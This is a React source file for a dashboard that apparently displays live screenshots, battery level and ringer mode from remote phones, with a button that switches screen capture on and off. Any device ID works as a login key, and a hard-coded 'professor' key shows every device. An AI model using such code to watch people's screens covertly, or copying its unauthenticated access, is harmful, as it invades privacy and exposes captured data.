
// // src/App.jsx
// import { useEffect, useState } from 'react';
// import { Smartphone, Wifi, WifiOff, Clock, Eye, Monitor, Battery, Volume2 } from 'lucide-react';
// import './App.css';

// const BASE_URL = 'https://third-eye-txe8.onrender.com';

// export default function App() {
//   const [devicesMap, setDevicesMap] = useState({});
//   const [keyInput, setKeyInput] = useState('');
//   const [accessKey, setAccessKey] = useState(null);
//   const [isLoading, setIsLoading] = useState(false);
//   const [connectionStatus, setConnectionStatus] = useState('connected');
//   const [lastUpdate, setLastUpdate] = useState(null);

//   useEffect(() => {
//     if (!accessKey) return;

//     const fetchData = async () => {
//       try {
//         setConnectionStatus('connecting');
//         const url = `${BASE_URL}/recent_background_api_data/${accessKey}`;
//         const res = await fetch(url);
//         if (!res.ok) throw new Error('Network response was not ok');
//         const json = await res.json();

//         let mapData;
//         if (accessKey === 'professor') {
//           mapData = json;
//         } else if (json.data !== undefined && json.received_at !== undefined) {
//           mapData = { [accessKey]: json };
//         } else {
//           mapData = json;
//         }

//         setDevicesMap(mapData);
//         setConnectionStatus('connected');
//         setLastUpdate(new Date());
//       } catch (err) {
//         console.error('Fetch error:', err);
//         setConnectionStatus('error');
//       } finally {
//         setIsLoading(false);
//       }
//     };

//     setIsLoading(true);
//     fetchData();
//     const interval = setInterval(fetchData, 5000);
//     return () => clearInterval(interval);
//   }, [accessKey]);

//   // Build array of devices
//   const allDevices = Object.entries(devicesMap).map(([uid, entry]) => ({
//     install_uid: uid,
//     ...entry.data,
//     received_at: entry.received_at,
//   }));
//   const visibleDevices = allDevices;

//   const getActiveDevices = () =>
//     visibleDevices.filter(d =>
//       Date.now() - new Date(d.received_at).getTime() < 30000
//     ).length;

//   const isDeviceActive = ts =>
//     ts && (Date.now() - new Date(ts).getTime() < 30000);

//   const handleLogin = e => {
//     e.preventDefault();
//     if (!keyInput.trim()) return;
//     setAccessKey(keyInput.trim());
//   };

//   // LOGIN
//   if (!accessKey) {
//     return (
//       <div className="min-h-screen flex items-center justify-center bg-slate-900">
//         <form onSubmit={handleLogin} className="bg-gray-800 p-8 rounded-xl shadow-lg">
//           <h2 className="text-white text-2xl mb-4">Enter Access Key</h2>
//           <input
//             type="text"
//             value={keyInput}
//             onChange={e => setKeyInput(e.target.value)}
//             placeholder="enter key"
//             className="w-full px-4 py-2 mb-4 rounded bg-gray-700 text-white focus:outline-none"
//           />
//           <button
//             type="submit"
//             className="w-full bg-purple-600 hover:bg-purple-700 text-white py-2 rounded"
//           >
//             Submit
//           </button>
//         </form>
//       </div>
//     );
//   }

//   // LOADING
//   if (isLoading) {
//     return (
//       <div className="min-h-screen flex items-center justify-center bg-slate-900">
//         <div className="text-center">
//           <div className="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-purple-500 mx-auto mb-4" />
//           <p className="text-white text-lg">Loading Mobile Feeds...</p>
//         </div>
//       </div>
//     );
//   }

//   // NO DEVICES
//   if (visibleDevices.length === 0 && accessKey !== 'professor') {
//     return (
//       <div className="min-h-screen flex items-center justify-center bg-slate-900 text-white">
//         <p>🔍 No device found with install_uid “{accessKey}”.</p>
//       </div>
//     );
//   }

//   // DASHBOARD
//   return (
//     <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
//       {/* HEADER */}
//       <header className="p-6 flex flex-col lg:flex-row items-center justify-between gap-4">
//         <div className="flex items-center gap-3">
//           <div className="p-3 bg-gradient-to-br from-purple-500 to-blue-600 rounded-2xl shadow-lg">
//             <Monitor className="w-8 h-8 text-white" />
//           </div>
//           <div>
//             <h1 className="text-4xl font-black text-white">Live Mobile Dashboard</h1>
//             <p className="text-gray-400 text-sm mt-1">
//               {accessKey === 'professor'
//                 ? 'Administrator view — all devices'
//                 : `Device: ${accessKey}`}
//             </p>
//           </div>
//         </div>
//         <div className="flex items-center gap-4">
//           {/* Connection Status */}
//           <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
//             {connectionStatus === 'connecting' ? (
//               <Wifi className="w-4 h-4 animate-pulse" />
//             ) : connectionStatus === 'error' ? (
//               <WifiOff className="w-4 h-4" />
//             ) : (
//               <Wifi className="w-4 h-4" />
//             )}
//             <span
//               className={`text-sm font-medium ${
//                 connectionStatus === 'connected'
//                   ? 'text-green-400'
//                   : connectionStatus === 'connecting'
//                   ? 'text-yellow-400'
//                   : 'text-red-400'
//               }`}
//             >
//               {connectionStatus.charAt(0).toUpperCase() + connectionStatus.slice(1)}
//             </span>
//           </div>
//           {/* Active / Total */}
//           <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
//             <Smartphone className="w-4 h-4 text-blue-400" />
//             <span className="text-white text-sm font-medium">
//               {getActiveDevices()}/{visibleDevices.length} Active
//             </span>
//           </div>
//           {/* Last Update */}
//           {lastUpdate && (
//             <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
//               <Clock className="w-4 h-4 text-gray-400" />
//               <span className="text-gray-300 text-xs">
//                 {lastUpdate.toLocaleTimeString()}
//               </span>
//             </div>
//           )}
//         </div>
//       </header>

//       {/* DEVICE GRID */}
//       <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6 px-6">
//         {visibleDevices.map(d => {
//           const active = isDeviceActive(d.received_at);
//           const ts = d.received_at && new Date(d.received_at);

//           return (
//             <div
//               key={d.install_uid}
//               className="group bg-black/40 backdrop-blur-sm rounded-3xl border border-white/10 hover:border-purple-500/50 transition-transform transform hover:scale-105"
//             >
//               {/* Card Header */}
//               <div className="relative p-4 bg-gradient-to-r from-purple-500/20 to-blue-500/20 border-b border-white/10">
//                 <div
//                   className={`absolute top-2 right-2 w-3 h-3 rounded-full ${
//                     active ? 'bg-green-400 animate-pulse' : 'bg-red-400'
//                   } shadow-lg`}
//                 />
//                 <div className="flex items-center gap-3">
//                   <div className="p-2 bg-white/10 rounded-xl">
//                     <Smartphone className="w-5 h-5 text-purple-400" />
//                   </div>
//                   <div className="flex-1 min-w-0">
//                     <h3 className="text-white font-bold truncate">{d.device_name}</h3>
//                     <div className="flex items-center gap-2 text-xs text-gray-300 mt-1">
//                       <Eye className="w-3 h-3" />
//                       <span>Live Feed</span>
//                       <Battery className="w-3 h-3" />
//                       <span>{d.battery_percentage}%</span>
//                       <Volume2 className="w-3 h-3" />
//                       <span className="capitalize">{d.ringer_mode}</span>
//                     </div>
//                   </div>
//                 </div>
//                 {ts && (
//                   <div className="mt-2 flex items-center gap-1 text-xs text-gray-400">
//                     <Clock className="w-3 h-3" />
//                     <span>
//                       {ts.toLocaleDateString()} at {ts.toLocaleTimeString()}
//                     </span>
//                   </div>
//                 )}
//               </div>

//               {/* Screenshot */}
//               <div className="aspect-[9/16] bg-gray-900">
//                 {d.screenshot_png_b64 ? (
//                   <img
//                     src={`data:image/webp;base64,${d.screenshot_png_b64}`}
//                     alt={`${d.device_name} screenshot`}
//                     className="w-full h-full object-contain"
//                     loading="lazy"
//                   />
//                 ) : (
//                   <div className="flex h-full items-center justify-center text-gray-500">
//                     <Monitor className="w-12 h-12 opacity-50" />
//                     <p className="text-center text-sm">No screenshot</p>
//                   </div>
//                 )}
//               </div>

//               {/* Card Footer */}
//               <div className="p-3 bg-black/30 backdrop-blur-sm">
//                 <div className="flex items-center justify-between text-xs">
//                   <span className={`flex items-center gap-1 font-medium ${active ? 'text-green-400' : 'text-red-400'}`}>
//                     <div className={`w-2 h-2 rounded-full ${active ? 'bg-green-400' : 'bg-red-400'}`} />
//                     {active ? 'Online' : 'Offline'}
//                   </span>
//                   {ts && (
//                     <span className="text-gray-400">
//                       {Math.round((Date.now() - ts.getTime()) / 1000)}s ago
//                     </span>
//                   )}
//                 </div>
//               </div>
//             </div>
//           );
//         })}
//       </div>

//       {/* Dashboard Footer */}
//       <footer className="mt-12 text-center">
//         <div className="inline-flex items-center gap-6 px-6 py-3 bg-black/20 backdrop-blur-sm rounded-2xl border border-white/10">
//           <div className="text-sm text-white">
//             Total Devices: <span className="font-bold">{visibleDevices.length}</span>
//           </div>
//           <div className="w-px h-4 bg-white/20" />
//           <div className="text-sm text-white">
//             Active: <span className="font-bold text-green-400">{getActiveDevices()}</span>
//           </div>
//           <div className="w-px h-4 bg-white/20" />
//           <div className="text-sm text-white">
//             Auto‑refresh: <span className="text-blue-400 font-bold">5s</span>
//           </div>
//         </div>
//       </footer>
//     </div>
//   );
// }

import { useEffect, useState } from 'react';
import {
  Smartphone, Wifi, WifiOff, Clock,
  Eye, Monitor, Battery, Volume2
} from 'lucide-react';
import './App.css';

const BASE_URL = 'https://third-eye-txe8.onrender.com';

export default function App() {
  const [accessKey, setAccessKey]       = useState(null);
  const [keyInput, setKeyInput]         = useState('');
  const [isConnected, setIsConnected]   = useState(false);
  const [devicesMap, setDevicesMap]     = useState({});
  const [isLoading, setIsLoading]       = useState(false);
  const [connectionStatus, setConnectionStatus] = useState('disconnected');
  const [lastUpdate, setLastUpdate]     = useState(null);

  // Fetch data every 5s
  useEffect(() => {
    if (!accessKey) return;
    const fetchData = async () => {
      try {
        setConnectionStatus('connecting');
        const res  = await fetch(`${BASE_URL}/recent_background_api_data/${accessKey}`);
        if (!res.ok) throw new Error('Fetch failed');
        const json = await res.json();
        let mapData;
        if (accessKey === 'professor') mapData = json;
        else if (json.data && json.received_at) mapData = { [accessKey]: json };
        else mapData = json;
        setDevicesMap(mapData);
        setConnectionStatus('connected');
        setLastUpdate(new Date());
      } catch {
        setConnectionStatus('error');
      } finally {
        setIsLoading(false);
      }
    };

    setIsLoading(true);
    fetchData();
    const iv = setInterval(fetchData, 5000);
    return () => clearInterval(iv);
  }, [accessKey]);

  // Toggle capture on/off
  const toggleConnection = async () => {
    const enable = !isConnected;
    try {
      const res = await fetch(`${BASE_URL}/control/${accessKey}`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ capture_enabled: enable })
      });
      if (res.ok) setIsConnected(enable);
    } catch (err) {
      console.error(err);
    }
  };

  // Login screen
  if (!accessKey) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-900">
        <form
          onSubmit={e => { e.preventDefault(); setAccessKey(keyInput.trim()); }}
          className="bg-gray-800 p-8 rounded-xl shadow-lg"
        >
          <h2 className="text-white text-2xl mb-4">Enter Access Key</h2>
          <input
            type="text"
            value={keyInput}
            onChange={e => setKeyInput(e.target.value)}
            placeholder="enter key"
            className="w-full px-4 py-2 mb-4 rounded bg-gray-700 text-white"
          />
          <button type="submit" className="w-full bg-purple-600 text-white py-2 rounded">
            Submit
          </button>
        </form>
      </div>
    );
  }

  // Loading
  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-900">
        <div className="text-center">
          <div className="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-purple-500 mx-auto mb-4"/>
          <p className="text-white text-lg">Loading Mobile Feeds...</p>
        </div>
      </div>
    );
  }

  // Build device list
  const allDevices = Object.entries(devicesMap).map(([uid, entry]) => ({
    install_uid: uid,
    ...entry.data,
    received_at: entry.received_at
  }));
  const visibleDevices = allDevices;

  const getActiveDevices = () =>
    visibleDevices.filter(d =>
      Date.now() - new Date(d.received_at).getTime() < 30000
    ).length;

  const isDeviceActive = ts =>
    ts && (Date.now() - new Date(ts).getTime() < 30000);

  // Dashboard
  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
      <header className="p-6 flex flex-col lg:flex-row items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="p-3 bg-gradient-to-br from-purple-500 to-blue-600 rounded-2xl shadow-lg">
            <Monitor className="w-8 h-8 text-white"/>
          </div>
          <div>
            <h1 className="text-4xl font-black text-white">Live Mobile Dashboard</h1>
            <p className="text-gray-400 text-sm mt-1">
              {accessKey === 'professor'
                ? 'Administrator view — all devices'
                : `Device: ${accessKey}`}
            </p>
          </div>
        </div>

        {/* Connect / Disconnect */}
        <button
          onClick={toggleConnection}
          className={`px-4 py-2 rounded-full font-medium ${
            isConnected ? 'bg-red-600 hover:bg-red-700' : 'bg-green-600 hover:bg-green-700'
          } text-white`}
        >
          {isConnected ? 'Disconnect' : 'Connect'}
        </button>

        <div className="flex items-center gap-4">
          {/* Connection Status */}
          <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
            {connectionStatus === 'connecting' ? (
              <Wifi className="w-4 h-4 animate-pulse"/>
            ) : connectionStatus === 'error' ? (
              <WifiOff className="w-4 h-4"/>
            ) : (
              <Wifi className="w-4 h-4"/>
            )}
            <span className={`text-sm font-medium ${
              connectionStatus === 'connected'   ? 'text-green-400' :
              connectionStatus === 'connecting'  ? 'text-yellow-400' :
                                                     'text-red-400'
            }`}>
              {connectionStatus.charAt(0).toUpperCase() + connectionStatus.slice(1)}
            </span>
          </div>

          {/* Active / Total */}
          <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
            <Smartphone className="w-4 h-4 text-blue-400"/>
            <span className="text-white text-sm font-medium">
              {getActiveDevices()}/{visibleDevices.length} Active
            </span>
          </div>

          {/* Last Update */}
          {lastUpdate && (
            <div className="flex items-center gap-2 px-4 py-2 bg-black/20 backdrop-blur-sm rounded-xl border border-white/10">
              <Clock className="w-4 h-4 text-gray-400"/>
              <span className="text-gray-300 text-xs">
                {lastUpdate.toLocaleTimeString()}
              </span>
            </div>
          )}
        </div>
      </header>

      {/* Device Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6 px-6">
        {visibleDevices.map(d => {
          const active = isDeviceActive(d.received_at);
          const ts     = d.received_at && new Date(d.received_at);
          return (
            <div
              key={d.install_uid}
              className="group bg-black/40 backdrop-blur-sm rounded-3xl border border-white/10 hover:border-purple-500/50 transition-transform transform hover:scale-105"
            >
              {/* Card Header */}
              <div className="relative p-4 bg-gradient-to-r from-purple-500/20 to-blue-500/20 border-b border-white/10">
                <div
                  className={`absolute top-2 right-2 w-3 h-3 rounded-full ${
                    active ? 'bg-green-400 animate-pulse' : 'bg-red-400'
                  } shadow-lg`}
                />
                <div className="flex items-center gap-3">
                  <div className="p-2 bg-white/10 rounded-xl">
                    <Smartphone className="w-5 h-5 text-purple-400"/>
                  </div>
                  <div className="flex-1 min-w-0">
                    <h3 className="text-white font-bold truncate">{d.device_name}</h3>
                    <div className="flex items-center gap-2 text-xs text-gray-300 mt-1">
                      <Eye className="w-3 h-3"/><span>Live Feed</span>
                      <Battery className="w-3 h-3"/><span>{d.battery_percentage}%</span>
                      <Volume2 className="w-3 h-3"/><span className="capitalize">{d.ringer_mode}</span>
                    </div>
                  </div>
                </div>
                {ts && (
                  <div className="mt-2 flex items-center gap-1 text-xs text-gray-400">
                    <Clock className="w-3 h-3"/>
                    <span>
                      {ts.toLocaleDateString()} at {ts.toLocaleTimeString()}
                    </span>
                  </div>
                )}
              </div>

              {/* Screenshot */}
              <div className="aspect-[9/16] bg-gray-900">
                {d.screenshot_png_b64 ? (
                  <img
                    src={`data:image/webp;base64,${d.screenshot_png_b64}`}
                    alt={`${d.device_name} screenshot`}
                    className="w-full h-full object-contain"
                    loading="lazy"
                  />
                ) : (
                  <div className="flex h-full items-center justify-center text-gray-500">
                    <Monitor className="w-12 h-12 opacity-50"/>
                    <p className="text-center text-sm">No screenshot</p>
                  </div>
                )}
              </div>

              {/* Card Footer */}
              <div className="p-3 bg-black/30 backdrop-blur-sm">
                <div className="flex items-center justify-between text-xs">
                  <span className={`flex items-center gap-1 font-medium ${
                    active ? 'text-green-400' : 'text-red-400'
                  }`}>
                    <div className={`w-2 h-2 rounded-full ${
                      active ? 'bg-green-400' : 'bg-red-400'
                    }`}/>
                    {active ? 'Online' : 'Offline'}
                  </span>
                  {ts && (
                    <span className="text-gray-400">
                      {Math.round((Date.now() - ts.getTime())/1000)}s ago
                    </span>
                  )}
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Footer */}
      <footer className="mt-12 text-center">
        <div className="inline-flex items-center gap-6 px-6 py-3 bg-black/20 backdrop-blur-sm rounded-2xl border border-white/10">
          <div className="text-sm text-white">
            Total Devices: <span className="font-bold">{visibleDevices.length}</span>
          </div>
          <div className="w-px h-4 bg-white/20"/>
          <div className="text-sm text-white">
            Active: <span className="font-bold text-green-400">{getActiveDevices()}</span>
          </div>
          <div className="w-px h-4 bg-white/20"/>
          <div className="text-sm text-white">
            Auto‑refresh: <span className="text-blue-400 font-bold">5s</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
